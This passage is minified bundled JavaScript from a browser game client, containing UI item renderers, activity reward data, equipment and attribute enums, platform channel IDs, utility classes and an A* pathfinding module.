e=this.gift.getItemIcon();this.flyItemEx(e),this.ins.sendReward(this.activityID,0,this.index+1)},e.prototype.dataChanged=function(){if(t.prototype.dataChanged.call(this),this.data){this.actType=this.data.actType;var e=this.data.config;this.activityID=e.Id;var i,o=this.index=this.data.index;if(this.ins=a.Activity.ins(),i=this.ins.activityData[e.Id]){this.targetTime.text="/"+e.reward[o].times,this.gift.data={id:e.reward[o].id,type:e.reward[o].type,count:e.reward[o].count},this.gift.isShowName(!1),this.lingqu.touchEnabled=!1;var s=0,r=i.count>=e.reward[o].times?e.reward[o].times:i.count;if(i.record>>o+1&1)this.lingqu.visible=!0,this.isget.touchEnabled=!1,s=65280;else if(this.lingqu.visible=!1,i.count>=e.reward[o].times)this.isget.touchEnabled=!0,s=65280;else{var l=e.reward[o-1],h=i.count,u=e.reward[o].times;l&&(h=i.count-l.times,u=e.reward[o].times-l.times),h=h>0?h:0,this.isget.touchEnabled=!1,s=16711680}this.alreadyTime.textFlow=n.TextFlowMaker.generateTextFlow1("|C:"+s+"&T:"+r),this.updateRedPoint(this.activityID,o)}}},e.prototype.updateRedPoint=function(t,e){var i=this.ins.isGetRollReward(t,e);this.redPoint.visible=i},e.prototype.flyItemEx=function(t){var e=new eui.Image(t.imgIcon.source);e.x=t.imgIcon.x,e.y=t.imgIcon.y,e.width=t.imgIcon.width,e.height=t.imgIcon.height,e.scaleX=t.imgIcon.scaleX,e.scaleY=t.imgIcon.scaleY,t.imgIcon.parent.addChild(e),s.GameLogic.ins().postFlyItemEx(e)},e}(o.BaseItemRender);e.OSATarget9Panel3ItemRender=r,window.OSATarget9Panel3ItemRender=r,__reflect(r.prototype,"OSATarget9Panel3ItemRender",[]),window.OSATarget9Panel3ItemRender=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ButtonItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e.sRp=!1,e.touchEnabled=!0,e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){var e,i,n,o,s;t.prototype.dataChanged.call(this),this.data&&(this.sRp=!!(null===(e=this.data)||void 0===e?void 0:e.sRp),this.sImg=null===(i=this.data)||void 0===i?void 0:i.sImg,this.labelDisplay.text=(null===(o=null===(n=this.data)||void 0===n?void 0:n[1])||void 0===o?void 0:o.name2)||(null===(s=this.data)||void 0===s?void 0:s.name2)||"")},e}(n.BaseItemRender);e.ButtonItem=o,window.ButtonItem=o,__reflect(o.prototype,"ButtonItem",[]),window.ButtonItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsItem=void 0;var n=i(1),o=i(5),s=i(16),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.index=0,e._sn_="TipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lab.stroke=1,this.lab.strokeColor=0,this.start()},e.prototype.start=function(){var t=this;this.skin&&(this.lab.textFlow=o.TextFlowMaker.generateTextFlow(this._labelText),this.addToEvent||(this.addToEvent=!0,Timer.start(1200,1,function(){t.removeFromParent()},this)))},e.prototype.setIndex=function(t){this.index=t},Object.defineProperty(e.prototype,"labelText",{get:function(){return this._labelText},set:function(t){this._labelText=t,this.start()},enumerable:!1,configurable:!0}),e.prototype.removeFromParent=function(){this.addToEvent=!1,s.DisplayUtils.removeFromParent(this),egret.Tween.removeTweens(this),ObjectPool.push(this)},e}(n.BaseView);e.TipsItem=a,window.TipsItem=a,__reflect(a.prototype,"TipsItem",[]),window.TipsItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlatFormID=void 0;var n=function(){function t(){}return t.SDK_TYPE=window.ourPlatform,t.WAN_BA="7000024",t.QQ_BROWSER="2000001",t.ZHI_SHANG="2000003",t.FENG_KUANG="2000004",t.AI_WEI_YOU="2000005",t.GE_TUI="2000006",t.XIN_LANG="2000007",t.$9G="2000012",t.QUN_HEI="2000013",t.$1758="2000014",t.ZI_JIE="7000172",t.WX_MINI="7000006",t.QQ_MINI="7000175",t.ZHONG_SHOU_YOU="7000179",t.QQ_BLUE="7000178",t.OPPO="7000169",t.OPPO_FENG="7000182",t.OPPO_MI="7000181",t.UC="7000223",t}();e.PlatFormID=n,window.PlatFormID=n,__reflect(n.prototype,"PlatFormID",[]),window.PlatFormID=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NpcModel=void 0;var n=i(622),o=i(0),s=function(t){function e(e){var i=t.call(this)||this;return i.data=e,i.type=EntityType.Npc,i}return __extends(e,t),Object.defineProperty(e.prototype,"avatarString",{get:function(){var t=o.GlobalConfig.NpcBaseConfig[this.configID];return t?t.avatar:null},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"avatarFileName",{get:function(){var t=this.npcConfig;return 1==t.actType?""+RES_DIR_BODY+t.avatar:""+RES_DIR_MONSTER+t.avatar},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"weaponFileName",{get:function(){var t=this.npcConfig;return t.weapon?""+RES_DIR_WEAPON+t.weapon:""},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"npcConfig",{get:function(){return o.GlobalConfig.NpcBaseConfig[this.configID]},enumerable:!1,configurable:!0}),e.prototype.clone=function(t){var e=egret.getQualifiedClassName(this);t=t||ObjectPool.pop(e);for(var i in this)"function"!=typeof this[i]&&"__class__"!=i&&"__types__"!=i&&(t[i]=this[i]);return t},e}(n.EffectModel);e.NpcModel=s,window.NpcModel=s,__reflect(s.prototype,"NpcModel",[]),window.NpcModel=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Version=void 0;var n,n=window.Version;!function(t){t.BUILD_NUMBER="V1.18.9.3.1544-Gane"}(n=e.Version||(e.Version={})),window.Version=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipAddAttrType=e.RUNE_POS_ATTR_MIN=void 0,e.RUNE_POS_ATTR_MIN=9999,window.RUNE_POS_ATTR_MIN=e.RUNE_POS_ATTR_MIN;var n;!function(t){t[t.EquipSlotType_Weapon=9999]="EquipSlotType_Weapon",t[t.EquipSlotType_Helmet=1e4]="EquipSlotType_Helmet",t[t.EquipSlotType_Coat=10001]="EquipSlotType_Coat",t[t.EquipSlotType_Necklace=10002]="EquipSlotType_Necklace",t[t.EquipSlotType_Accessory1=10003]="EquipSlotType_Accessory1",t[t.EquipSlotType_Accessory2=10004]="EquipSlotType_Accessory2",t[t.EquipSlotType_Ring1=10005]="EquipSlotType_Ring1",t[t.EquipSlotType_Ring2=10006]="EquipSlotType_Ring2",t[t.EquipSlotType_Dzi=10007]="EquipSlotType_Dzi",t[t.EquipSlotType_Max=10008]="EquipSlotType_Max"
}(n=e.EquipAddAttrType||(e.EquipAddAttrType={})),window.EquipAddAttrType=n,window.EquipAddAttrType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExAttributeType=void 0;var n;!function(t){t[t.eatReflectProbability=0]="eatReflectProbability",t[t.eatReflectRate=1]="eatReflectRate",t[t.eatIgnoreReflect=2]="eatIgnoreReflect",t[t.eatGodBlessProbability=3]="eatGodBlessProbability",t[t.eatGodBlessRate=4]="eatGodBlessRate",t[t.eatDeathCurseProbability=5]="eatDeathCurseProbability",t[t.eatDeathCurseDamageIncrease=6]="eatDeathCurseDamageIncrease",t[t.eatDeathCurseTime=7]="eatDeathCurseTime",t[t.eatAllCrit=8]="eatAllCrit",t[t.eatAllCritTime=9]="eatAllCritTime",t[t.eatBeHitTimesDodge=10]="eatBeHitTimesDodge",t[t.eatAttackTimesCrit=11]="eatAttackTimesCrit",t[t.eatAttackAddHpProbability=12]="eatAttackAddHpProbability",t[t.eatAttackAddHpValue=13]="eatAttackAddHpValue",t[t.eatAddToWarriorDamageInc=14]="eatAddToWarriorDamageInc",t[t.eatAddToMageDamageInc=15]="eatAddToMageDamageInc",t[t.eatAddToTaoistDamageInc=16]="eatAddToTaoistDamageInc",t[t.eatSubWarriorDamageInc=17]="eatSubWarriorDamageInc",t[t.eatSubMageDamageInc=18]="eatSubMageDamageInc",t[t.eatSubTaoistDamageInc=19]="eatSubTaoistDamageInc",t[t.eatTogetherHitFree=20]="eatTogetherHitFree",t[t.eatTogetherHitMonDamageInc=21]="eatTogetherHitMonDamageInc",t[t.eatTogetherHitRoleDamageInc=22]="eatTogetherHitRoleDamageInc",t[t.eatTogetherHitCdSub=23]="eatTogetherHitCdSub",t[t.eatAdditionalHarm=24]="eatAdditionalHarm",t[t.eatReductionHarm=25]="eatReductionHarm",t[t.eatMiss=26]="eatMiss",t[t.eatBaseSkillExArg=27]="eatBaseSkillExArg",t[t.eatMultipleCrit=28]="eatMultipleCrit",t[t.eatMultipleCritCoeff=29]="eatMultipleCritCoeff",t[t.atMultipleCritHurt=30]="atMultipleCritHurt",t[t.eatAddWarriorDamageInc=31]="eatAddWarriorDamageInc",t[t.eatAddMageDamageInc=32]="eatAddMageDamageInc",t[t.eatAddTaoistDamageInc=33]="eatAddTaoistDamageInc",t[t.eatMultipleCritTime=34]="eatMultipleCritTime",t[t.eatAttackAddHpTime=35]="eatAttackAddHpTime",t[t.eatStunTime=36]="eatStunTime",t[t.eatGodPowerCd=37]="eatGodPowerCd",t[t.eatGodPowerProbability=38]="eatGodPowerProbability",t[t.eatGodPowerDamageIncrease=39]="eatGodPowerDamageIncrease",t[t.eatHpLtAddBuffId=40]="eatHpLtAddBuffId",t[t.eatHpLtAddBuffCd=41]="eatHpLtAddBuffCd",t[t.eatHit=42]="eatHit",t[t.eatSkillVamirePro=43]="eatSkillVamirePro",t[t.eatWarriorPeakDamageInc=44]="eatWarriorPeakDamageInc",t[t.eatMagePeakDamageInc=45]="eatMagePeakDamageInc",t[t.eatTaoistPeakDamageInc=46]="eatTaoistPeakDamageInc",t[t.eatPetSkillLevel=47]="eatPetSkillLevel",t[t.eatPetAttackInc=48]="eatPetAttackInc",t[t.eatSkillAddArgA=49]="eatSkillAddArgA",t[t.eatSkillAddArgB=50]="eatSkillAddArgB",t[t.eatResistDeathCd=51]="eatResistDeathCd",t[t.eatResistDeathPro=52]="eatResistDeathPro",t[t.eatResistDeathRate=53]="eatResistDeathRate",t[t.eatCritHpLt=54]="eatCritHpLt",t[t.eatCritHpLtAddDamage=55]="eatCritHpLtAddDamage",t[t.eatMiJiKNHpPer=56]="eatMiJiKNHpPer",t[t.eatMiJiKNHpSubPer=57]="eatMiJiKNHpSubPer",t[t.eatMiJiKNDamPer=58]="eatMiJiKNDamPer",t[t.eatMiJiZHDamPer=59]="eatMiJiZHDamPer",t[t.eatMiJiZHTime=60]="eatMiJiZHTime",t[t.eatMiJiBQHpTime=61]="eatMiJiBQHpTime",t[t.eatMiJiBQHpPer=62]="eatMiJiBQHpPer",t[t.eatMiJiBQBuffId=63]="eatMiJiBQBuffId",t[t.eatLeitingDefMiss=64]="eatLeitingDefMiss",t[t.eatLeitingResMiss=65]="eatLeitingResMiss",t[t.eatVamirePro=66]="eatVamirePro",t[t.eatLianjiAddToMonsterDamageInc=67]="eatLianjiAddToMonsterDamageInc",t[t.eatLianjiAddToActorDamageInc=68]="eatLianjiAddToActorDamageInc",t[t.eatLianjiAddPowerInc=69]="eatLianjiAddPowerInc",t[t.eatLianjiAddToWarriorDamageInc=70]="eatLianjiAddToWarriorDamageInc",t[t.eatLianjiAddToMageDamageInc=71]="eatLianjiAddToMageDamageInc",t[t.eatLianjiAddToTaoistDamageInc=72]="eatLianjiAddToTaoistDamageInc",t[t.eatLianjiAddToCrit=73]="eatLianjiAddToCrit",t[t.eatLianjiSubDamage111=78]="eatLianjiSubDamage111",t[t.eatLianjiSubDamage112=79]="eatLianjiSubDamage112",t[t.eatLianjiSubDamage113=80]="eatLianjiSubDamage113",t[t.eatLianjiSubDamage114=81]="eatLianjiSubDamage114",t[t.eatCount=82]="eatCount",t[t.eatTogetherHitAddHuntRate=90]="eatTogetherHitAddHuntRate",t[t.eatTogetherHitAddAngerProbility=91]="eatTogetherHitAddAngerProbility",t[t.eatTogetherHitAddAngerRate=92]="eatTogetherHitAddAngerRate",t[t.eatTogetherHitCritRate=93]="eatTogetherHitCritRate",t[t.eatNewAdditionalHarm=151]="eatNewAdditionalHarm",t[t.eatNewReductionHarm=152]="eatNewReductionHarm",t[t.eatBlessing=1e3]="eatBlessing"}(n=e.ExAttributeType||(e.ExAttributeType={})),window.ExAttributeType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StateShowType=e.ActivityType0Data=void 0;var n=i(8),o=i(0),s=i(7),a=i(33),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.specialState=function(){var t=o.GlobalConfig.ActivityBtnConfig[this.id];return t?!0:!1},e.prototype.canReward=function(){var t=o.GlobalConfig.ActivityBtnConfig[this.id];return t?!1:!1},e.prototype.getHide=function(){var t=o.GlobalConfig.ActivityBtnConfig[this.id];return t?this.isHide?this.isHide:this.isHide:!1},e.prototype.isOpenActivity=function(){var t=Math.floor((this.startTime-s.GameServerCC.serverTime)/1e3),e=Math.floor((this.endTime-s.GameServerCC.serverTime)/1e3);if(0>t&&e>0)return!0;var i=o.GlobalConfig.ActivityBtnConfig[this.id];return i?!1:!1},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((n.DateUtils.formatMiniDateTime(this.endTime)-s.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e}(a.ActivityBaseData);e.ActivityType0Data=r,window.ActivityType0Data=r,__reflect(r.prototype,"ActivityType0Data",[]),window.ActivityType0Data=r;var l;!function(t){t[t.TYPE_9=9]="TYPE_9"}(l=e.StateShowType||(e.StateShowType={})),window.StateShowType=l,window.StateShowType=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DelayOptManager=void 0;var n=i(50),o=function(t){function e(){var e=t.call(this)||this;return e.TIME_THRESHOLD=2,e._delayOpts=[],egret.startTick(e.runCachedFun,e),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.addDelayOptFunction=function(t,e,i,n,o){this._delayOpts.push({fun:e,funPara:i,thisObj:t,callBack:n,para:o})},e.prototype.clear=function(){this._delayOpts.length=0},e.prototype.runCachedFun=function(t){if(0==this._delayOpts.length)return!1;for(var e,i=egret.getTimer();this._delayOpts.length&&(e=this._delayOpts.shift(),e.funPara?e.fun.call(e.thisObj,e.funPara):e.fun.call(e.thisObj),e.callBack&&(void 0!=e.para?e.callBack.call(e.thisObj,e.para):e.callBack()),!(egret.getTimer()-i>this.TIME_THRESHOLD)););return!1},e}(n.BaseClass);e.DelayOptManager=o,window.DelayOptManager=o,__reflect(o.prototype,"DelayOptManager",[]),window.DelayOptManager=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AchievementData=void 0;var n=function(){function t(){}return t}();e.AchievementData=n,window.AchievementData=n,__reflect(n.prototype,"AchievementData",[]),window.AchievementData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TaskData=void 0;var n=function(){function t(){}return t.prototype.parser=function(t){this.id=t.readInt(),this.value=t.readInt(),this.state=t.readByte()},t}();e.TaskData=n,window.TaskData=n,__reflect(n.prototype,"TaskData",[]),window.TaskData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType41Data=void 0;var n=i(0),o=i(33),s=i(35),a=i(17),r=i(9),l=i(7),h=function(t){function e(e){var i=t.call(this,e)||this;return i.resetms=0,i.update(e),i.initRps(),i}return __extends(e,t),e.prototype.update=function(t){var e=t.readByte(),i=t.readByte();this.hasBuy=1==e,this.ybhasBuy=1==i,this.resetms=1e3*t.readInt()+l.GameServerCC.serverTime},e.prototype.canReward=function(){var t=n.GlobalConfig.ActivityType41Config[this.id];if(!t)return!1;var e=s.TaskCT.ins().getInvestmentAllTask(t.taskid);if(!e||!e.tasks)return!1;for(var i in e.tasks)if(1==e.tasks[i].status)return!0;return!1},e.prototype.getCanGetRewardId=function(){var t=n.GlobalConfig.ActivityType41Config[this.id],e=s.TaskCT.ins().getInvestmentAllTask(t.taskid);if(!e||!e.tasks)return 0;for(var i in e.tasks)if(1==e.tasks[i].status)return e.tasks[i].taskIndex;return 0},e.prototype.getCurDay=function(){var t=n.GlobalConfig.ActivityType41Config[this.id],e=s.TaskCT.ins().getInvestmentAllTask(t.taskid),i=0;if(!e||!e.tasks)return i;for(var o in e.tasks)switch(e.tasks[o].status){case 1:case 2:i++}return s.TaskCT.ins().dayNum=i,i},e.prototype.initRps=function(){var t=this;this.rp=new a.RedPoint(function(){if(!t.hasBuy||window.platform.isshen())return!1;var e=n.GlobalConfig.ActivityType41Config[t.id],i=n.GlobalConfig.InvestmentTaskConfig[null===e||void 0===e?void 0:e.taskid],o=!1;for(var a in i){var r=i[a],l=s.TaskCT.ins().getInvestmentTask(r.id,r.index);if(l&&1==l.status){o=!0;break}}return o},r.Activity.ins().postRewardResult,r.Activity.ins().postChangePage,r.Activity.ins().postActivityIsGetAwards,s.TaskCT.ins().postInvestmentTaskData,s.TaskCT.ins().postOneInvestmentTask)},e}(o.ActivityBaseData);e.ActivityType41Data=h,window.ActivityType41Data=h,__reflect(h.prototype,"ActivityType41Data",[]),window.ActivityType41Data=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayPrefixData=void 0;var n=i(0),o=function(){function t(){this.id=0,this.lv=0}return t.prototype.parser=function(t){this.id=t.readInt(),this.lv=t.readInt();t.readInt()},Object.defineProperty(t.prototype,"config",{get:function(){return this.baseConfig||(this.baseConfig=n.GlobalConfig.GemPrefixConfig[this.id])},enumerable:!1,configurable:!0}),t.prototype.getSkills=function(){var t;return null===(t=this.config)||void 0===t?void 0:t.skill},t.prototype.getSkillId=function(){var t;return null===(t=this.config)||void 0===t?void 0:t.skill[this.lv-1]},t.prototype.getIcon=function(){var t;return null===(t=this.config)||void 0===t?void 0:t.icon},t.prototype.getName=function(){var t;return null===(t=this.config)||void 0===t?void 0:t.name},t.prototype.getBody=function(){var t;return null===(t=this.config)||void 0===t?void 0:t.body},t.prototype.getLvColor=function(){var t;return(null===(t=n.GlobalConfig.GemUpdateConfig[this.lv])||void 0===t?void 0:t.lvColor)||0},t}();e.EquipInlayPrefixData=o,window.EquipInlayPrefixData=o,__reflect(o.prototype,"EquipInlayPrefixData",[]),window.EquipInlayPrefixData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ObjectUtils=void 0;var n=i(209),o=function(){function t(){}return t.deepClone=function(e){switch(t.kindof(e)){case"array":return e.slice();case"object":return t.assign(e);default:return e}},t.kindof=function(e){if(void 0===e)return n.GConst.Types.Undefined;if(null===e)return n.GConst.Types.Null;var i=t._typeof(e);return i===n.GConst.Types.Boolean?n.GConst.Types.Boolean:i===n.GConst.Types.String?n.GConst.Types.String:i===n.GConst.Types.Number?n.GConst.Types.Number:"symbol"===i?"symbol":i===n.GConst.Types.Function?t.isGeneratorFn(e)?"generatorfunction":n.GConst.Types.Function:t.isArray(e)?n.GConst.Types.Array:t.isArguments(e)?n.GConst.Types.Arguments:t.isDate(e)?"date":n.GConst.Types.Undefined},t._typeof=function(t){return typeof t},t.isGeneratorFn=function(e,i){return"GeneratorFunction"===t.ctorName(e)},t.ctorName=function(t){return t.constructor?t.constructor.name:null},t.isArray=function(t){return Array.isArray?Array.isArray(t):t instanceof Array},t.isDate=function(t){return t instanceof Date?!0:"function"==typeof t.toDateString&&"function"==typeof t.getDate&&"function"==typeof t.setDate},t.isArguments=function(t){try{if("number"==typeof t.length&&"function"==typeof t.callee)return!0}catch(e){if(-1!==e.message.indexOf("callee"))return!0}return!1},t.assign=function(t){var e=egret.getQualifiedClassName(t),i=ObjectPool.pop(e);for(var n in t)"function"!=typeof t[n]&&"__class__"!=n&&"__types__"!=n&&(i[n]=t[n]);return i},t.toObject=function(t){if(null===t||void 0===t)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(t)},t.IsArray=function(t){return t&&"object"==typeof t&&t instanceof Array},t.DeepClone=function(t,e){e=this.IsArray(t)?e||[]:e||{};for(var i in t)Object.prototype.hasOwnProperty.call(t,i)&&("object"==typeof t[i]&&null!==typeof t[i]?(e[i]=this.IsArray(t[i])?[]:{},this.DeepClone(t[i],e[i])):e[i]=t[i]);return e},t.SimpleClone=function(t,e){e=this.IsArray(t)?e||[]:e||{};for(var i in t)Object.prototype.hasOwnProperty.call(t,i)&&(e[i]=t[i]);return e},t}();e.ObjectUtils=o,window.ObjectUtils=o,__reflect(o.prototype,"ObjectUtils",[]),window.ObjectUtils=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShowImgCT=void 0;var n=i(281),o=i(14),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.showImg=function(t,e){void 0===t&&(t="meltYuanBao_png"),void 0===e&&(e={horizontalCenter:77.5,y:0});var i=win.open("ShowImgView");i.img=t,i.targetPos=e,n.DelayOptManager.ins().addDelayOptFunction(i,i.showImg)},e.prototype.showMoveImg=function(t,e,i,o){void 0===t&&(t="meltYuanBao_png"),void 0===e&&(e={x:0,y:0}),void 0===i&&(i=7),void 0===o&&(o=0);var s=win.open("ShowImgView");n.DelayOptManager.ins().addDelayOptFunction(s,s.showMoveImg,[t,e,i,o])},e}(o.BaseSystem);e.ShowImgCT=s,window.ShowImgCT=s,__reflect(s.prototype,"ShowImgCT",[]),window.ShowImgCT=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TargetType=void 0;var n;!function(t){t[t.Friendly=1]="Friendly",t[t.Enemy=2]="Enemy",t[t.My=3]="My"}(n=e.TargetType||(e.TargetType={})),window.TargetType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MapGrid=void 0;var n=i(634),o=function(t){function e(){var e=t.call(this)||this;return e.touchEnabled=!1,e._poolNodes=[],e}return __extends(e,t),Object.defineProperty(e.prototype,"numCols",{get:function(){return this._numCols},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"numRows",{get:function(){return this._numRows},enumerable:!1,configurable:!0}),e.prototype.getNode=function(t,e){return this._nodes[t]?this._nodes[t][e]:void 0},e.prototype.isWalkableTile=function(t,e){return 0>t||t>=this._numCols||0>e||e>=this._numRows?!1:this._nodes[t][e].walkable},e.prototype.destruct=function(){this.clearNodes()},e.prototype.initMapInfo=function(t,e){this._nodes&&this.clearNodes(),this._numRows=t.maxY,this._numCols=t.maxX,this._nodes=[];for(var i,n=0;n<this._numCols;n++){this._nodes[n]=[];for(var o=0;o<this._numRows;o++)i=this.getGridNode(),i.flags=t.grids[n*this._numRows+o],this._nodes[n][o]=i}e&&this._nodes.reverse()},e.prototype.clearNodes=function(){for(var t in this._nodes)this._poolNodes=this._poolNodes.concat(this._nodes[t]),this._nodes[t].length=0;this._nodes.length=0},e.prototype.getGridNode=function(){return this._poolNodes.pop()||new n.MapGridNode},e.prototype._trace=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];null!=this.debugTrace&&this.debugTrace.apply(null,t)},e}(egret.Sprite);e.MapGrid=o,window.MapGrid=o,__reflect(o.prototype,"MapGrid",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ASMapCell=e.AStar=void 0;var n=i(291),o=function(){function t(t){void 0===t&&(t=null),this.m_nMarkTag=0,t&&this.initFromMap(t)}return t.prototype.initFromMap=function(t){var e=0;this.m_ASMapCells?e=this.m_ASMapCells.length:this.m_ASMapCells=[],this.m_nWidth=t.numCols,this.m_nHeight=t.numRows;var i=this.m_nWidth*this.m_nHeight;i>this.m_ASMapCells.length&&(this.m_ASMapCells.length=i);for(var n=e;i>n;++n)this.m_ASMapCells[n]=new s;var o,a,r,l;for(r=0,a=0;a<this.m_nHeight;++a)for(o=0;o<this.m_nWidth;++o)l=this.m_ASMapCells[r],l.X=o,l.Y=a,l.CanNotMove=!t.isWalkableTile(o,a),r++},t.prototype.getPath=function(e,i,o,a,r){if(e==o&&i==a)return null;if(0>e||e>=this.m_nWidth||0>i||i>=this.m_nHeight)return void console.log("寻路的起始位置参数无效：("+e+", "+i+")");if(0>o||o>=this.m_nWidth||0>a||a>=this.m_nHeight)return void console.log("寻路的目的位置参数无效：("+o+", "+a+")");var l=this.m_ASMapCells[a*this.m_nWidth+o];if(!l)return null;this.reset(e,i);var h=!1,u=e,p=i,d=this.m_ASMapCells[p*this.m_nWidth+u];if(!d)return null;d.GCost=0,d.LastX=-1,d.LastY=-1,d.X=u,d.Y=p,d.MarkTag=this.m_nMarkTag,d.HCost=Math.abs(o-e)+10*Math.abs(a-i);for(var c,f,g,m;;){if(u==o&&p==a){h=!0;break}for(d.State!=s.CSCLOSE&&this.closeCell(d),c=0;8>c;++c)f=u+t.NEIGHBORPOS_X_VALUES[c],g=p+t.NEIGHBORPOS_Y_VALUES[c],0>f||f>=this.m_nWidth||0>g||g>=this.m_nHeight||1!=c&&3!=c&&5!=c&&7!=c&&(m=this.m_ASMapCells[g*this.m_nWidth+f],m.CanNotMove||(m.MarkTag!=this.m_nMarkTag||m.State==s.CSNONE?(m.MarkTag=this.m_nMarkTag,m.LastX=u,m.LastY=p,m.btDir=c,m.GCost=d.GCost+t.AS_MOVECOST[1&c],m.HCost=Math.abs(o-f)+10*Math.abs(a-g),this.openCell(m)):m.State==s.CSOPEN&&m.GCost>d.GCost+t.AS_MOVECOST[1&c]&&(m.LastX=u,m.LastY=p,m.btDir=c,m.GCost=d.GCost+t.AS_MOVECOST[1&c],this.reopenCell(m))));if(d=this.m_LastOpenCell,null==d)break;u=d.X,p=d.Y}if(h){for(var v=[];;)if(v.push(new n.AStarNode(d.X,d.Y,d.btDir)),d=this.m_ASMapCells[d.LastY*this.m_nWidth+d.LastX],d.LastX<=0&&d.LastY<=0||d.MarkTag!=this.m_nMarkTag)break;return v}return null},t.prototype.reset=function(t,e){var i=this.m_ASMapCells[e*this.m_nWidth+t];i.LastX=0,i.LastY=0,i.HCost=0,i.GCost=0,i.FValue=0,i.State=0,i.Prev=null,i.Next=null,i.btDir=0,this.m_LastOpenCell=null,this.m_nMarkTag=this.m_nMarkTag+1},t.prototype.closeCell=function(t){t.State==s.CSOPEN&&(t.Prev&&(t.Prev.Next=t.Next),t.Next&&(t.Next.Prev=t.Prev),t==this.m_LastOpenCell&&(this.m_LastOpenCell=t.Prev)),t.State=s.CSCLOSE},t.prototype.openCell=function(t){t.State=s.CSOPEN;var e=t.HCost+t.GCost;t.FValue=e;var i=this.m_LastOpenCell;if(i){for(;i.FValue<e;){if(null==i.Prev)return i.Prev=t,t.Prev=null,void(t.Next=i);i=i.Prev}t.Prev=i,i.Next?(t.Next=i.Next,i.Next.Prev=t,i.Next=t):(t.Next=null,i.Next=t,this.m_LastOpenCell=t)}else this.m_LastOpenCell=t,t.Prev=null,t.Next=null},t.prototype.reopenCell=function(t){var e=t.HCost+t.GCost;t.FValue=e;var i=t.Next;if(i&&i.FValue>e){do i=i.Next;while(i&&i.FValue>e);t.Prev&&(t.Prev.Next=t.Next),t.Next&&(t.Next.Prev=t.Prev),i?(t.Next=i,i.Prev?(t.Prev=i.Prev,i.Prev.Next=t):t.Prev=null,i.Prev=t):(t.Prev=this.m_LastOpenCell,t.Next=null,this.m_LastOpenCell.Next=t,this.m_LastOpenCell=t)}},t.prototype.getCell=function(t,e){return this.m_ASMapCells[e*this.m_nWidth+t]?this.m_ASMapCells[e*this.m_nWidth+t]:void 0},Object.defineProperty(t.prototype,"maxX",{get:function(){return this.m_nWidth},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"maxY",{get:function(){return this.m_nHeight},enumerable:!1,configurable:!0}),t.RMOVECOST=14,t.DMOVECOST=10,t.AS_MOVECOST=[t.DMOVECOST,t.RMOVECOST],t.NEIGHBORPOS_X_VALUES=[0,1,1,1,0,-1,-1,-1],t.NEIGHBORPOS_Y_VALUES=[-1,-1,0,1,1,1,0,-1],t.NEIGHBORPOS_X_VALUES2=[0,1,2,2,2,2,2,1,0,-1,-2,-2,-2,-2,-2,-1],t.NEIGHBORPOS_Y_VALUES2=[-2,-2,-2,-1,0,1,2,2,2,2,2,1,0,-1,-2,-2],t}();e.AStar=o,window.AStar=o,__reflect(o.prototype,"AStar",[]);var s=function(){function t(){}return t.CSNONE=0,t.CSOPEN=1,t.CSCLOSE=2,t}();e.ASMapCell=s,window.ASMapCell=s,__reflect(s.prototype,"ASMapCell",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AStarNode=void 0;var n=function(){function t(t,e,i){this.nX=t,this.nY=e,this.nDir=i}return t}();e.AStarNode=n,window.AStarNode=n,__reflect(n.prototype,"AStarNode",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildApplyInfo=void 0;var n=function(){function t(){}return t}();e.GuildApplyInfo=n,window.GuildApplyInfo=n,__reflect(n.prototype,"GuildApplyInfo",[]),window.GuildApplyInfo=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Item_BianQiang=void 0;var n=i(19),o=i(3),s=i(67),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="PowerItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addEvent(egret.TouchEvent.TOUCH_TAP,this.btn_go,this.go)},e.prototype.dataChanged=function(){var 